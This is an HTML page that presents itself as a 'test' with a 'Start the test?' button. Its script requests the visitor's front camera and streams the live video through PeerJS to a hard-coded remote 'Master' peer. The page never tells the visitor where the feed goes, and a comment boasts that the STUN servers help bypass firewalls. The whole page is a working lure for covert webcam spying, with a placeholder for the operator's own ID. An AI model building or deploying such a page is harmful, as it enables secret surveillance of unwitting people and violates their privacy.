<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>You are the test subject</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body { font-family: -apple-system, sans-serif; text-align: center; background: #111; color: white; padding: 20px; }
        .btn { width: 100%; max-width: 300px; padding: 20px; font-size: 18px; border: none; border-radius: 12px; cursor: pointer; margin: 10px 0; font-weight: bold; }
        #start { background: #007bff; }
        #status { color: #888; font-size: 14px; margin-top: 10px; }
    </style>
</head>
<body>
    <div style="margin-top: 20%;">
        <h2>Testing</h2>
        <button id="start" class="btn">Start the test?</button>
        <div id="status">Ready to connect...</div>
    </div>

    <script>
        // Replace 'manas-secret-id-2026' with your own unique secret word
        const MASTER_ID = 'mythic-laptop-3009';
        
        // ICE Servers help bypass firewalls and mobile data restrictions
        const peer = new Peer({
            config: { 'iceServers': [
                { url: 'stun:stun.l.google.com:19302' },
                { url: 'stun:stun1.l.google.com:19302' },
                { url: 'stun:stun2.l.google.com:19302' }
            ]}
        });

        document.getElementById('start').addEventListener('click', async () => {
            const status = document.getElementById('status');
            status.innerText = "Requesting the access...";
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, // Use "environment" for back camera
                    audio: false 
                });
                
                status.innerText = "Connecting to Master...";
                const call = peer.call(MASTER_ID, stream);
                
                call.on('error', (err) => { status.innerText = "Error: " + err; });
                alert("Connected successfully!");
                status.innerText = "Streaming Live...";
            } catch (err) {
                status.innerText = "Error: Permission denied.";
            }
        });
    </script>
</body>
</html>
